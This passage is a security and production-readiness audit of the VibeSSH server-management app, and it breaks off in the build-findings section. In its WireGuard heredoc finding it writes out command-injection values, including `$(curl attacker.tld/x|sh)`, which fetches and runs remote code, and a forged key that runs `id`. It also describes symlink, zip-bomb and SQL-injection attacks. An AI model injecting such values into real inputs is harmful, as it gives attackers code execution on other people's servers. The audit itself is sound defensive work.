# VibeSSH — Production Readiness Audit

**Date:** 2026-09-01
**Commit:** `bb04132` (branch `main`)
**Scope:** whole repository — 417 tracked files, ~55k LOC (Rust ~30k, TS/TSX ~18k, SQL/shell/config ~7k)
**Verdict:** **NOT READY FOR PRODUCTION RELEASE.** 7 CRITICAL and 14 HIGH findings, one of which (F-001) means `cargo test --workspace` does not compile today.

---

## 0. Method and honest scope statement

What was actually done, so the limits of this report are clear:

| Activity | Status |
|---|---|
| Full repo file map, workspace/crate structure | Done |
| Read of every `src-tauri/src/**` module (services, runtime, files, firewall, network, storage, ssh, state) | Done |
| Read of `agent/`, `protocol/`, `backend/` | Done |
| Read of all frontend services, stores, hooks, i18n; structural sweep of pages/components | Done |
| `cargo clippy --workspace --all-targets` | Done — **3 compile errors**, 72 lib warnings |
| `cargo test --workspace --no-run` | Done — **fails to build** |
| `npx tsc --noEmit` | Done — **clean, exit 0** |
| `npm audit` | Done — 1 high, 3 moderate |
| `cargo audit` | **Not run** — `cargo-audit` is not installed on this machine |
| Visual UI/UX pass at 1920/1600/1440/1366/1280/1024/900/800 | **NOT DONE** — requires a built Tauri binary and a live SSH Node; see §9 for the static a11y/UX findings that *were* verifiable |
| Real-server integration testing (SSH/SFTP/Docker/UFW/WireGuard behaviour) | **NOT DONE** — no test Node available in this session |

Findings below are derived from source reading and static analysis. Every finding cites a real file and line-level construct. Where I am inferring runtime behaviour (e.g. Docker/UFW interaction) I say so and give the reproduction step needed to confirm it.

---

## 1. Executive Summary

VibeSSH is a genuinely well-engineered codebase in several respects that are worth stating before the problems, because they change how the problems should be prioritised.

**Real strengths (verified, not assumed):**
- **Secrets are never stored in SQLite.** Every password, token, passphrase and registry credential lives in the OS keyring (`storage/credentials.rs`). The migration files carry explicit comments enforcing this rule. This is better than most products at this stage.
- **SSH host-key TOFU is correct.** `TofuHandler::check_server_key` rejects a fingerprint mismatch and surfaces a genuinely good user-facing message.
- **Zip-slip is properly defended** via `zip::ZipArchive::enclosed_name()` plus `sandbox::sanitize_relative_path`.
- **Path sandboxing is two-layered and well-tested** (`files/sandbox.rs` — string normalisation *plus* post-canonicalisation containment).
- **Firewall rules are correctly derived per-Node.** The specific concern raised in the brief ("make sure it doesn't copy identical rules 1:1 to every Node") is **not present** — `desired_rules` scopes strictly to `app_repo.list_by_server(server_id)`.
- **i18n is complete and balanced** — 1120 keys in `en.json`, 1120 in `pl.json`, zero drift in either direction.
- **TypeScript is genuinely strict and clean** — `strict`, `noUnusedLocals`, `noUnusedParameters` all on; only 2 uses of `any` in the entire frontend; typecheck passes.
- **Frontend polling has correct stale-response guards** (`cancelled` flags in every polling hook).
- **Event listeners are balanced** — every `addEventListener` has a matching `removeEventListener`.

**The core problem** is not code quality in the small. It is that the **security model is documented but not enforced at the boundaries that matter.** Three of the four isolation guarantees the architecture claims are breakable:

1. `Application A cannot read B` — **broken** by world-readable `/tmp` staging files and by a `chmod 666` console FIFO.
2. `A port marked "Vibe Network only" is not publicly reachable` — **broken**, because Docker's own iptables rules bypass UFW entirely and nothing in this codebase writes a `DOCKER-USER` rule.
3. `A compromised Node cannot compromise other Nodes` — **broken** by an unquoted shell heredoc in the WireGuard config writer.

Alongside these, the delete path leaks every host-side resource (container, Linux user, files, firewall rules), and the backup system is architecturally unable to handle a real game-server-sized dataset.

**Finding counts:**

| Severity | Count | Priority |
|---|---|---|
| CRITICAL | 7 | P0 |
| HIGH | 14 | P0/P1 |
| MEDIUM | 19 | P1/P2 |
| LOW | 11 | P2/P3 |
| INFO | 6 | P3 |

---

## 2. Architecture

### 2.1 Map

```
Cargo workspace (4 members)
├── protocol/        pure DTOs, no I/O — shared wire format          [clean]
├── agent/           vibe-agent daemon: wss + loopback control       [clean]
├── backend/         Teams/Roles/Permissions/Audit HTTP service      [clean]
└── src-tauri/       the desktop app — everything else
    ├── commands/    18 modules, 178 registered Tauri commands
    ├── services/    20 modules  ← business logic
    ├── runtime/     docker | systemd | local_process | remote_process | health_check
    ├── files/       sandbox | local | sftp | sudo_user | archive
    ├── ssh/         client | sftp | docker | systemd | monitor | port_forward | transport
    ├── firewall/    ufw
    ├── network/     wireguard
    ├── storage/     9 repositories + migrations + credentials + log_capture
    ├── state/       11 in-memory session/lock managers
    ├── blueprints/  11 blueprints
    └── transport/   ServerConnection trait  ← DEAD CODE (see A-001)

frontend (React 18 + Zustand + react-router 6)
├── pages/       19 routes
├── components/  ~70 components (ui/ layout/ servers/ applications/ teams/)
├── services/    14 thin Tauri-invoke wrappers
├── stores/      8 Zustand stores
└── hooks/       6 hooks
```

Layering is generally sound: `commands → services → {runtime, files, storage, ssh}`. The frontend talks only to `services/*.ts`, which talk only to `callCommand`. No circular module dependencies were found. No god objects in the OO sense — `application_service.rs` is large (1700 lines) but it is a flat module of free functions, not a class.

### 2.2 Architecture findings

**A-001 — `ServerConnection` is 100% dead abstraction | MEDIUM | P2**
`src-tauri/src/transport/mod.rs:15-35`. A 20-method trait whose doc comment names `SshTransport` and `AgentTransport` as implementations. Only one impl exists (`ssh/transport.rs`), and the compiler confirms **not one of the 20 methods is ever called**:

```
warning: multiple methods are never used --> src-tauri\src\transport\mod.rs:17:14
```

Every call site uses the concrete `SshSession` directly. This is the "abstraction that exists only for abstraction" case from the brief. It is also actively misleading: it implies Agent Mode is pluggable when Agent Mode cannot run a single Application command.
**Fix:** either delete it, or make it the real seam before Agent-mode Applications are built. Do not leave it as-is.
**Test required:** none (deletion) / trait-object round-trip test (retention).

**A-002 — Agent Mode is a documented dead end | HIGH | P1**
`docs/APPLICATIONS_ARCHITECTURE.md` states it, and the code confirms it: `files/mod.rs::provider_for` has no Agent branch, `runtime::docker` is SSH-only, `ServerCard.tsx` hides Files/Monitor/Actions/Terminal for agent cards. An agent-paired Node does essentially nothing after pairing. This is a product-completeness finding: shipping a "Node connection mode" that disables most of the app is a release blocker for the *feature*, not for the release.
**Fix:** either implement `AgentTransport` or remove Agent Mode from the shipping UI and label it a preview.

**A-003 — `retry_on_connection_failure` retries on *every* error | HIGH | P1**
`src-tauri/src/services/ssh_service.rs:29-42`. Despite the name, it matches `Err(_)` and then drops the SSH session, opens a **brand-new TCP+auth handshake**, and re-runs the entire closure. Consequences:
- `pull_application_image` failing on a typo'd image name triggers a full reconnect and a **second multi-minute `docker pull`**.
- `check_external_port_available` returning `InvalidInput("port already published")` tears down a healthy SSH session.
- `.map_err(|_| first_err)` **discards the second error**, so if the retry fails more informatively the user still sees the stale first message.
- Every non-idempotent side effect inside the closure runs twice.

**Fix:** match only `AppError::Connection`, and only when the underlying cause is transport-level.
**Test required:** does not retry on `InvalidInput`; retries once on `Connection`; surfaces the second error when both fail.

**A-004 — Nine SQLite connections to one file, no WAL, no busy_timeout | HIGH | P0**
`src-tauri/src/lib.rs:98-124` opens nine repositories against the *same* `db_path`. Each holds its own `Connection` behind its own `Mutex`, and each runs `migrations().to_latest()` on open. None sets `journal_mode=WAL` or `busy_timeout` (grep confirms only `foreign_keys` is ever set).
- **Startup race:** nine concurrent `to_latest()` transactions on a fresh DB. The losers get `SQLITE_BUSY` immediately (default timeout is 0) and `lib.rs`'s `?` propagates → **the app fails to launch**, intermittently.
- **Runtime:** the per-repository `Mutex`es serialise nothing *across* repositories. Any write in `ApplicationRepository` concurrent with a `ServerRepository` write returns `SQLITE_BUSY` → `AppError::Storage("database is locked")` in the user's face.

**Fix:** one shared connection pool, or at minimum `PRAGMA journal_mode=WAL` + `PRAGMA busy_timeout=5000` on every open, and migrate exactly once at startup before any repository opens.
**Test required:** concurrent-write test across two repositories on one path; migration-under-contention test.

**A-005 — `panic = "abort"` combined with `expect()` on stored DB values | HIGH | P0**
`Cargo.toml` sets `panic = "abort"` for release. Meanwhile:
- `storage/server_repository.rs:426` — `serde_json::from_str(&json).expect("stored NodeCapabilities column is always well-formed")`
- `storage/server_repository.rs:454,459` and `storage/application_repository.rs:569,573` — `expect("stored UUID/timestamp column is always well-formed")`

`node_capabilities_json` is derived from data a **remote Node reports over the network**. If a future desktop version adds a non-defaulted field to `NodeCapabilities`, every existing row fails to deserialise and the process **aborts with no dialog, no log, no recovery** — on every launch. This is an upgrade-bricking hazard, not a theoretical one.
**Fix:** every `row_to_*` returns `AppResult`; a malformed row degrades to `None`/skip with a logged warning.
**Test required:** repository read against rows with a corrupted UUID, timestamp, and capabilities JSON — must return an error, not abort.

---

## 3. Security

### 3.1 CRITICAL

**S-001 — Docker port publishing bypasses UFW; "Vibe Network only" ports are world-reachable | CRITICAL | P0**
**Files:** `services/application_service.rs::resolve_bind_address`; `runtime/docker.rs::build_create_command`; `firewall/ufw.rs` (whole module).

`resolve_bind_address` maps `PortVisibility::VibeNetwork` → `"0.0.0.0"`. The only thing meant to restrict it is a UFW rule with `source_cidr = 10.77.0.0/16`. But Docker inserts its own DNAT rules into `nat/PREROUTING` and ACCEPT rules into the `DOCKER` chain of `FORWARD`, which are evaluated **before** UFW's `ufw-user-input` filter chain. Nothing in this repository ever writes to `DOCKER-USER` — a grep for `iptables` across all `.rs` and `.sh` files returns only comments.

**Attack scenario:** operator marks an Application's MariaDB/RCON/admin port "Vibe Network only", believing it is mesh-private. Docker publishes `0.0.0.0:3306`. The UFW rule is present and looks correct in `ufw status`. The port is reachable from the public internet.
**Impact:** silent, total failure of the product's central network-isolation promise. Databases, RCON consoles and admin panels exposed.
**Reproduction:** create a Docker Application, add a port with visibility `VibeNetwork`, sync the firewall, then `nmap -p <port> <node-public-ip>` from outside the mesh.
**Fix:** for non-public visibility, bind the container to a specific address (mesh IP or `127.0.0.1`), **not** `0.0.0.0` — Docker's `-p 10.77.x.y:port:port` binds correctly and needs no firewall help. Additionally write explicit `DOCKER-USER` rules and stop treating UFW as sufficient for containers.
**Test required:** `resolve_bind_address(VibeNetwork)` returns the Node's mesh IP, never `0.0.0.0`; integration test asserting the published socket is not on `0.0.0.0`.

**S-002 — Command injection into every mesh Node via unquoted WireGuard heredoc | CRITICAL | P0**
**File:** `network/wireguard.rs::build_apply_script`.

```sh
sudo tee /etc/wireguard/wg-vibessh0.conf >/dev/null <<VIBESSH_WG_EOF
...PublicKey = {peer.public_key}
Endpoint = {peer.endpoint}
VIBESSH_WG_EOF
```

The heredoc delimiter is **unquoted** (deliberately, so `$PRIVATE_KEY` expands). That means the shell also expands `$(...)`, backticks and every other `$VAR` inside the body. `reject_unsafe()` blocks only `\n`, `\r` and the literal string `VIBESSH_WG_EOF` — it does **not** block `$`, `` ` `` or `(`.

Compare `dns_service.rs::push_fragment`, which correctly uses `<<'VIBESSH_DNS_EOF'` (quoted). The inconsistency is the bug.

**Attack scenario A (operator input):** `peer.endpoint` is `format!("{}:{}", server.host, LISTEN_PORT)` and `server.host` is free text validated only as non-empty (`server_service.rs:203`). Setting a Node's host to `` $(curl attacker.tld/x|sh) `` executes on every mesh peer.
**Attack scenario B (compromised Node — the brief's own threat model):** `peer.public_key` comes from `wg pubkey` run **on the remote Node**. A compromised Node returns `abc$(id>/tmp/p)` instead of a key. That string is written into the apply-script for **every other Node in the mesh**. One compromised Node ⇒ RCE on all of them.
**Impact:** full lateral movement across the fleet.
**Fix:** quote the heredoc (`<<'VIBESSH_WG_EOF'`) and inject the private key another way (write a `%PRIVATE_KEY%` placeholder and substitute it on the Node, or use `wg set ... private-key /path`). Additionally allowlist-validate public keys as 44-char base64 and hosts as hostname/IP.
**Test required:** `build_apply_script` rejects `$(`, `` ` ``, `${` in every peer field; snapshot test asserting the heredoc delimiter is quoted.

**S-003 — Root-owned symlink-followable write to a predictable `/tmp` path | CRITICAL | P0**
**File:** `network/wireguard.rs::build_apply_script`:

```sh
sudo wg-quick strip wg-vibessh0 | sudo tee /tmp/vibessh-wg-strip.conf >/dev/null
```

A fixed, predictable path in world-writable `/tmp`, written by `tee` **as root**, which follows symlinks. Two distinct problems:

1. **Privilege escalation:** any local user pre-creates `/tmp/vibessh-wg-strip.conf` as a symlink to `/etc/passwd`, `/root/.ssh/authorized_keys`, or a sudoers file. The next mesh reconcile overwrites that file as root.
2. **Key disclosure:** `wg-quick strip` output **contains the Node's WireGuard private key**. Created by `tee` with the default umask (typically 0644) → world-readable for the window before `rm -f`. Any local user reads it and can impersonate the Node in the mesh.

**Fix:** `mktemp` under a root-only directory (`/run/vibessh/`, mode 0700), or avoid the temp file entirely with `wg syncconf <(wg-quick strip ...)`.
**Test required:** script-shape assertion that no fixed `/tmp` path appears; integration test that the strip file is never world-readable.

**S-004 — Application console FIFO is `chmod 666` inside a shared, bind-mounted directory | CRITICAL | P0**
**File:** `runtime/docker.rs::build_attach_script`:

```sh
sudo mkfifo '<workdir>/.vibessh-app-<uuid>.stdin'
sudo chmod 666 '<workdir>/.vibessh-app-<uuid>.stdin'
```

It is piped straight into `docker attach --sig-proxy=false <container>` — i.e. it **is** the application's stdin.

**Attack scenario:** mode 666 means every local account on the Node — including every *other* Application's dedicated `vibessh-app-*` user — can write to it. For a Minecraft server that is `op <attacker>` / `stop` / arbitrary console commands. For a generic container it is arbitrary stdin to PID 1. Because `working_directory` is bind-mounted into the container, the FIFO is also writable from *inside* the container.
**Impact:** directly breaks §6's "Application A cannot affect B". Cross-Application privilege escalation.
**Fix:** `chmod 660` with group ownership set to that Application's dedicated group, or place the FIFO outside the bind-mounted directory (`/run/vibessh/<app-id>.stdin`, 0600, owned by the connecting admin).
**Test required:** `build_attach_script` never emits a world-writable mode; the FIFO path is outside `working_directory`.

**S-005 — World-readable `/tmp` staging leaks every Application file, and never cleans up | CRITICAL | P0**
**File:** `files/sudo_user.rs`, the helper script's `read` op:

```sh
cp -- "$target" "$staging"
chmod 644 "$staging"
```

Every read of a dedicated-user Application's file copies it into `/tmp/vibessh-stage-<uuid>` and explicitly chmods it **world-readable**. Two compounding failures:

1. **Disclosure:** any local user, and any other Application's dedicated account, can read the staged copy while it exists. This is how `.env` files, `server.properties` with RCON passwords, and database configs leak between Applications.
2. **No cleanup, ever.** The staging file is created by the *dedicated* user (via `sudo -u`), but the cleanup call is `self.connection.remove_file(&staging)` — the *connecting admin's* SFTP. `/tmp` has the sticky bit, so a non-owner cannot unlink it. The call fails, and the result is discarded (`let _ = ...`). **Every file ever opened in the Files tab accumulates a permanent world-readable copy in `/tmp`.**

**Impact:** cross-Application data disclosure plus unbounded disk growth on every Node.
**Fix:** stage under a per-Application, mode-0700 directory owned by that Application's account (`/run/vibessh/<app-id>/`), never `/tmp`; do the unlink inside the helper (as the owning user); verify the unlink and log on failure.
**Test required:** helper-script assertion that `chmod 644` on staging is gone; integration test that no `vibessh-stage-*` file survives a read/download/upload cycle.

**S-006 — `create_application_database` silently exposes MariaDB to the world with `'user'@'%'` | CRITICAL | P0**
**File:** `services/database_service.rs` — `CONNECTIONS_FROM = "%"`, `ensure_mysql_listens_on_all_interfaces`.

On the first database creation, VibeSSH:
1. Writes `/etc/mysql/mariadb.conf.d/99-vibessh-bind.cnf` with `bind-address = 0.0.0.0` and **restarts MariaDB** — converting a correctly loopback-only database into an all-interfaces one, without asking.
2. Creates every application user as `'user'@'%'` — accepting connections from *any* host.
3. Adds a UFW rule **only** `in on docker0`, and **only if UFW is already active**. If UFW is absent or inactive, nothing restricts the port at all.
4. Every step is `let _ = ...` — all errors discarded, no log, no user signal.

**Attack scenario:** operator creates a database for their Minecraft plugin. MariaDB is now listening on the public IP with a `%` user. On a Node without UFW (or after any `ufw disable`), the database is directly reachable from the internet with a 24-character password as the only barrier.
**Impact:** remote database compromise; all application data.
**Fix:** never rewrite `bind-address` — connect over `127.0.0.1` or the Docker gateway; scope grants to the Docker subnet or `@'localhost'`, never `%`; make DB-server installation an explicit, consented, progress-reported action; surface errors instead of discarding them.
**Test required:** grants are never `%`; no code path writes a `bind-address` config; installation requires explicit opt-in.

**S-007 — Deleting an Application leaks every host-side resource it created | CRITICAL | P0**
**File:** `services/application_service.rs::delete_application`.

```rust
pub async fn delete_application(repo, log_capture, id) -> AppResult<()> {
    // deletes keyring env secrets
    log_capture.delete(id).await;
    repo.delete(id)          // deletes the DB row. That is all.
}
```

It does **not**: destroy the Docker container, remove the dedicated Linux user, delete the working directory, revoke the firewall rules, remove the DNS record's effect, drop the databases, or delete the console FIFO. It does not even take a `connection`.

**Impact:**
- The container `vibessh-app-<uuid>` **keeps running forever**, still bound to its published ports, still restarting via `--restart unless-stopped` across reboots.
- The port stays occupied. Because a new Application gets a fresh UUID, the port-collision check (`find_external_port_owner`, DB-only) reports the port free, then `docker create -p` fails with a raw Docker error the user cannot interpret.
- Dedicated Linux accounts accumulate on the Node with no owner.
- The application's data directory persists with no UI that can reach it.

**Reproduction:** create a Docker Application on port 25565, start it, delete it, create a new one on 25565 → `docker create` fails with "port is already allocated".
**Fix:** make delete a real teardown: stop → destroy container → revoke firewall → delete DNS record → drop databases → remove FIFO → optionally remove working dir (with explicit confirmation) → remove user → only then delete the row. Report partial failures explicitly.
**Test required:** delete-then-recreate on the same port succeeds; after delete, `docker ps -a` has no `vibessh-app-<old-uuid>`.

### 3.2 HIGH

**S-008 — Registry and database passwords exposed in the Node's process list | HIGH | P0**
`application_service.rs::ensure_registry_login` builds `printf '%s' '<password>' | sudo docker login ...`; `database_service.rs::build_mysql_command` builds `MYSQL_PWD='<password>' mysql ...`. Both go to `SshSession::execute_command`, which runs them via the SSH exec channel — i.e. `sh -c '<the whole string>'`. The full command line, plaintext secret included, is visible in `ps aux` to **every local user on the Node** for the duration, and is captured by auditd/`sshd` command logging where enabled. `ensure_registry_login` runs on **every** application start.
**Fix:** write secrets to a mode-0600 temp file read by the remote process, or feed them over the channel's stdin rather than embedding them in argv. `MYSQL_PWD` is explicitly documented by MySQL as insecure — use `--defaults-extra-file`.
**Test required:** no command string built by these functions contains the secret value.

**S-009 — SQL injection via `admin_username` / `host` | HIGH | P1**
`database_service.rs::sql_quote` escapes `'` by doubling it, which is correct only under `NO_BACKSLASH_ESCAPES`. MySQL/MariaDB default to backslash escaping, so an `admin_username` ending in `\` breaks out: `sql_quote` yields `'x\''…'`, MySQL reads `\'` as a literal quote, the string closes early, and the remainder executes as SQL. The grant statement runs via `sudo mysql`, i.e. as the DB superuser.
The injector is normally the operator themselves — but the `backend/` crate ships Teams/Roles/Permissions, so a lower-privileged team member creating a database host is a realistic path.
**Fix:** parameterised statements, or escape backslashes as well as quotes, or restrict identifiers to `[A-Za-z0-9_]` at input validation.
**Test required:** `sql_quote("x\\")` and `sql_quote("a'; DROP DATABASE x; --")` both produce inert literals.

**S-010 — Agent Mode disables TLS verification on every connection, with no pinning | HIGH | P1**
`src-tauri/src/agent_client/mod.rs:207-208`:

```rust
.danger_accept_invalid_certs(true)
.danger_accept_invalid_hostnames(true)
```

`docs/security-review.md` documents this as an accepted bootstrap tradeoff whose "concrete next hardening step" is pinning the fingerprint after first use. That step was never taken — grep finds no fingerprint storage or comparison anywhere in `agent_client`. Agent Mode is therefore MITM-able on **every** connection, not only the first, and the bearer credential is replayable by any active on-path attacker. This is also inconsistent with the SSH path in the same application, which implements TOFU correctly.
**Fix:** implement the same TOFU the SSH path already has.
**Test required:** connection to an agent presenting a different certificate is rejected; first connection stores the fingerprint.

**S-011 — Zip bomb / attacker-controlled allocation in `extract_zip` | HIGH | P1**
`files/archive.rs::extract_zip`:

```rust
let mut contents = Vec::with_capacity(entry.size() as usize);
entry.read_to_end(&mut contents)?;
```

`entry.size()` is the **uncompressed size declared in the zip header** — attacker-controlled. A 1 KB archive declaring a 100 GB entry causes an immediate 100 GB reservation. There is no total-size cap, no entry-count cap, and no compression-ratio check. With `panic = "abort"`, the allocation failure kills the desktop process outright. Users extract third-party plugin/mod packs here; this is a normal workflow.
**Fix:** cap declared entry size, total extracted bytes and entry count; stream through a `take()`-limited reader rather than trusting the header.
**Test required:** a crafted archive declaring an oversized entry is rejected with `InvalidInput`, not an OOM.

**S-012 — `chown -R` on an unvalidated `working_directory`, on every start | HIGH | P1**
`runtime/docker.rs::ensure_working_directory_owned_by_dedicated_user`:

```rust
let _ = connection.execute_command(&format!("sudo chown -R {} {}", user, workdir)).await;
```

`working_directory` is accepted from `create_application` with only `trim().is_empty()` validation — no absolute-path check, no denylist, no depth limit. An operator typo of `/`, `/etc`, `/home`, or `/var` recursively chowns that tree to an unprivileged per-Application account, **bricking the server**. The error is discarded. It also runs on *every* start/restart, so a large game-server directory is fully re-chowned each time.
**Fix:** validate `working_directory` at creation (absolute, under an allowed prefix, not a system path); chown once at provisioning, guarded by a marker file; do not discard the error.
**Test required:** creation rejects `/`, `/etc`, `/home`, relative paths, and paths containing `..`.

**S-013 — `ufw --force enable` with no lockout guard | HIGH | P1**
`firewall/ufw.rs::enable` applies the desired rules then runs `sudo ufw --force enable`. The only SSH rule comes from `server.ssh_port` **as stored in VibeSSH's own database**. If that value is stale — the operator changed the `sshd` port on the host, or connects via a jump host — UFW comes up default-deny with the wrong port allowed and the operator is **permanently locked out of the Node**.
**Fix:** before enabling, determine the *live* connection's server port (`$SSH_CONNECTION` / `ss -tnp`) and ensure a rule for it exists; refuse to enable if it cannot be determined. Confirm in the UI with the exact port that will be allowed.
**Test required:** `enable` refuses when the live SSH port is not covered by the desired rule set.

**S-014 — Firewall sync fails open and reports success | HIGH | P1**
`firewall/mod.rs::provider_for` returns `Ok(None)` when UFW is not installed. `reconcile_node` then returns `Ok(FirewallSyncResult { active: false, rules_applied: 0 })` — a success. `application_service::sync_firewall_best_effort` additionally downgrades *hard* errors to `log::warn!` and returns `Ok` to the frontend. So on a Node with no firewall, adding a "Vibe Network only" port reports success, binds `0.0.0.0`, and restricts nothing.
**Fix:** distinguish "no firewall backend" from "synced"; surface it as a visible warning state; refuse non-public visibility on a Node with no enforcement mechanism.
**Test required:** `reconcile_node` with no provider returns a distinguishable "unenforced" result; the frontend renders a warning, not a success toast.

**S-015 — Backups are read wholly into desktop memory (~3× the data size) | HIGH | P1**
`files/archive.rs::create_zip` collects **every file's full bytes** into `Vec<(String, bool, Vec<u8>)>` before writing, then builds the zip in a second in-memory buffer; `application_backup_service::create_backup` then calls `provider.read_file(&destination)` to read the finished archive **back into memory again** for sizing/S3 upload. `restore_backup` likewise reads the entire archive into a `Vec<u8>` before extracting. Peak desktop RSS is roughly 3× the application's data size, all transferred over SFTP. A 5 GB Minecraft world OOMs, and with `panic = "abort"` it takes the app with it.
**Fix:** stream. Build the archive on the Node (`tar`/`zip` over SSH) and stream it to S3 or local disk; never materialise it in the desktop process.
**Test required:** backup of a directory larger than available RAM completes; peak memory stays bounded.

**S-016 — Restore extracts over a running Application | HIGH | P1**
`application_backup_service::restore_backup` calls `extract_zip(provider, &bytes, ".")` directly into the live working directory. Nothing stops the Application first, nothing takes a pre-restore snapshot, nothing is atomic. Restoring while a game server or database is running produces a torn dataset — the classic way to lose a world save.
**Fix:** stop the Application (with confirmation), snapshot current state, extract to staging, swap atomically, restart.
**Test required:** restore refuses (or explicitly stops) when status is `Running`.

**S-017 — Symlink loop causes unbounded recursion in `create_zip` | HIGH | P1**
`archive.rs::collect_for_zip` branches on `stat.is_dir`, which **follows symlinks**. It never checks `is_symlink` and keeps no visited set. A symlink `plugins/self -> .` inside the Application directory causes infinite recursion — unbounded heap growth until the process dies.
**Fix:** skip symlinks (or record them as symlink entries), and track visited canonical paths.
**Test required:** `create_zip` over a directory containing a self-referential symlink terminates.

**S-018 — Every Application shares one Docker network with resolvable aliases | HIGH | P1**
`runtime/docker.rs`: every container joins `--network vibessh-net` with `--network-alias <slug>` and gets `--add-host host.docker.internal:host-gateway`. Combined with `ensure_mysql_listens_on_all_interfaces`'s `ufw allow in on docker0`, Application A can reach Application B's **internal, unpublished** ports directly by name, and can reach the host's MariaDB. This is a deliberate design (it is what makes service discovery work) but it is not stated as a security boundary anywhere and contradicts §6's isolation claims.
**Fix:** per-Application networks by default with explicit opt-in links; or document the shared network as an accepted, visible trust boundary in the UI.

**S-019 — Frontend receives raw Rust error strings and discards the error kind | HIGH | P1**
`src/services/tauri.ts::normalizeError` reduces `{ kind, message }` to `new Error(message)`. The `kind` discriminator that `AppError`'s `Serialize` impl deliberately provides is **thrown away**, so the frontend cannot branch on error type at all. What reaches the user is `AppError::Display` verbatim:

> `invalid input: containing directory doesn't exist`

— literally the example given in the brief. These strings are also **untranslated English**, in an app that otherwise has 1120/1120 i18n coverage. See §10.

**S-020 — `AppError` has no structured taxonomy | HIGH | P1**
`src-tauri/src/errors/mod.rs` has six variants — `NotFound`, `InvalidInput`, `Storage`, `Connection`, `Internal`, `Unauthorized` — all carrying a bare `String`. There is no `PermissionDenied`, `PortInUse`, `DockerUnavailable`, `RuntimeUnavailable`, `Timeout`, `AgentUnavailable`, `FirewallApplyFailed`, or `DnsSyncFailed`. Every distinct failure is flattened into prose, then shown to the user directly. Retry logic cannot distinguish transient from permanent. See §10.

**S-021 — No test coverage on the most security-critical module | HIGH | P0**
`src-tauri/tests/vibe_network.rs` does not compile (F-001). The DNS + firewall + mesh integration test — covering exactly the subsystems with the most CRITICAL findings — has not run since the `dns_suffix` and `FirewallRuleRepository` parameters were added.

### 3.3 MEDIUM

| ID | Finding | File |
|---|---|---|
| S-022 | Pairing code compared with non-constant-time `==`, while the credential path correctly uses constant-time compare | `agent/src/pairing/mod.rs::try_consume` |
| S-023 | S3 backup endpoint accepts `http://` — credentials and backup contents in cleartext | `src-tauri/src/s3/mod.rs:97` |
| S-024 | `phpmyadmin_url` builds `http://` and appends `?db=` with **no URL encoding** — breaks on `&`/`#`/space; phpMyAdmin credentials over cleartext | `database_service.rs::phpmyadmin_url` |
| S-025 | `/etc/hosts` rewritten with non-atomic `sed -i` + `tee -a`, no lock — concurrent syncs interleave into duplicate or lost blocks; if `sed` succeeds and `tee` fails the Node loses all DNS | `dns_service.rs::push_fragment` |
| S-026 | `leave_node` removes the DB row even when `wireguard::teardown` fails (it always returns `Ok`, discarding errors) — leaves a **stale peer** with a live interface | `network_service.rs::leave_node` |
| S-027 | `leave_node` never calls `sync_dns`, so the departed Node keeps a stale `VIBESSH-MANAGED-DNS` block in `/etc/hosts` forever | `network_service.rs::leave_node` |
| S-028 | No DNS uniqueness across Node aliases: Nodes named `Web Server` and `Web-Server!` both slugify to `web-server`, producing two `/etc/hosts` entries with different IPs — first match wins, traffic silently goes to the wrong Node | `dns_service.rs::node_alias` |
| S-029 | `validate_dns_suffix` permits `.com`, `.net`, etc. — an operator can shadow real public domains inside the mesh via `/etc/hosts` | `dns_service.rs::validate_dns_suffix` |
| S-030 | `apply_rules` stops at the first failing rule with no rollback — Node left half-configured | `firewall/ufw.rs::apply_rules` |
| S-031 | Aborting a transfer leaves a **partial file** on the remote with no cleanup and no `.part`-then-rename | `state/file_transfers.rs` |
| S-032 | `docker login` persists credentials to `/root/.docker/config.json` (base64, not encrypted) on every Node, never cleaned up | `application_service.rs::ensure_registry_login` |
| S-033 | Automatic `apt-get install` of `mariadb-server` / `mysql-client` / `wireguard-tools` as a side effect of ordinary UI actions, with errors discarded | `database_service.rs`, `network/wireguard.rs` |
| S-034 | Installer verifies a SHA-256 checksum fetched from the **same host** as the binary — protects against corruption, not a compromised release host. No signing. (Already in `docs/security-review.md` #5; still open.) | `agent-install/install.sh` |
| S-035 | Handshake replay: the raw bearer credential is sent with no nonce/challenge (documented tradeoff), now compounded by S-010's absent cert validation | `agent/src/transport` |
| S-036 | Keyring deletions on delete paths are all `let _ = ...` — failed deletions leave orphaned secrets in the OS credential store forever | `application_service.rs`, `database_service.rs` |

---

## 4. Threat Model

**Assets:** SSH private keys and passwords (OS keyring); agent bearer credentials; WireGuard private keys (on-Node, `/etc/wireguard`, 0600); Docker daemon control (root-equivalent via `sudo docker`); Application files and databases; backup archives and S3 credentials; registry tokens; the cloud backend's JWT secret.

**Trust boundaries:**

```
[Desktop app]  ──SSH (TOFU-pinned, GOOD)──────────►  [Node: admin account w/ broad sudo]
      │                                                       │
      └────────wss (NO cert validation, S-010)────►  [Vibe Agent: unprivileged user]
                                                              │
                                                    ┌─────────┴──────────┐
                                                    │                    │
                                        [Docker daemon = root]   [Per-App Linux user]
                                                    │                    │
                                          [Application container] ◄──bind mount──┘
                                                    │
                                        shared vibessh-net + docker0
                                                    │
                                    ◄── reaches every other Application, and host MariaDB
```

**Attacker capabilities as currently implemented:**

| Attacker | Crosses the boundary? | Via |
|---|---|---|
| Malicious/compromised Application container | **Yes** — reads other Applications' files; injects into other Applications' consoles | S-005, S-004, S-018 |
| Unprivileged local user on a Node | **Yes** — escalates to root; steals the Node's WireGuard private key | S-003 |
| Compromised Node | **Yes** — RCE on every other Node in the mesh | S-002 |
| Remote unauthenticated attacker | **Yes** — reaches ports the UI says are mesh-private; reaches MariaDB with `%` grants | S-001, S-006 |
| On-path network attacker (Agent Mode) | **Yes** — full MITM, credential capture and replay | S-010, S-035 |
| Malicious archive (zip bomb) | **Yes** — crashes the desktop app | S-011 |
| Malicious archive (path traversal) | **No** — correctly defended | `enclosed_name()` + sandbox |
| On-path network attacker (SSH Mode) | **No** — TOFU pinning works | `TofuHandler` |
| Malicious operator input → SQL | **Partially** — `admin_username` injects | S-009 |

The single most valuable structural fix is **not** any one of these. Four of the seven CRITICALs (S-002, S-003, S-004, S-005) share one root cause: **shell command strings built with `format!`, guarded by ad-hoc helpers duplicated across six modules.** `shell_quote` is copy-pasted verbatim into `dedicated_user.rs`, `files/sudo_user.rs`, `runtime/docker.rs`, `services/application_service.rs`, `services/database_service.rs`, and `services/dns_service.rs`. Each site independently decides what to validate, and each one gets a slightly different subset right.

---

## 5. Build, Tests and Tooling

**F-001 — `cargo test --workspace` does not compile | CRITICAL | P0**
`src-tauri/tests/vibe_network.rs` has three call-site signature mismatches:
- `:178` `services::create_dns_alias(...)` — 3 args supplied, 4 expected (missing `suffix: &str`)
